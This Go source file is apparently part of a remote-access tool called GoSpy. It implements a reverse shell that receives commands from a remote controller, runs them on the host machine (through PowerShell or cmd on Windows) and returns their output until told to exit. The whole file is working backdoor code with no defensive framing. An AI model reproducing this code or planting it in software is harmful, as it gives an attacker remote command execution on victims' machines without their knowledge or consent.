package shell

import (
	"github.com/psidex/GoSpy/internal/comms"
	"os/exec"
	"runtime"
	"strings"
)

// StartReverseShell starts a reverse shell from the current machine to address.
// Will return with err if an error occurs.
func StartReverseShell(cm comms.PacketManager) (err error) {
	for {
		messageBytes, err := cm.RecvBytes()
		if err != nil {
			return err
		}

		message := strings.TrimSpace(string(messageBytes))

		if message == "exit" {
			return nil
		}

		args := strings.Fields(message)
		res := execArgs(args)
		res = strings.TrimSpace(res)

		err = cm.SendBytes([]byte(res))
		if err != nil {
			return err
		}
	}
}

// execArgs takes a list of arguments (the first one being a binary) and executes it locally.
// If on Windows, attempts to use Powershell. Uses cmd as a backup.
func execArgs(args []string) (out string) {
	if runtime.GOOS == "windows" {
		var cmdPrefix []string

		_, err := exec.LookPath("Powershell")
		if err != nil {
			cmdPrefix = append(cmdPrefix, "cmd", "/C")
		} else {
			cmdPrefix = append(cmdPrefix, "Powershell")
		}

		args = append(cmdPrefix, args...)
	}

	outBytes, err := exec.Command(args[0], args[1:]...).Output()
	if err != nil {
		return err.Error()
	}
	return string(outBytes)
}
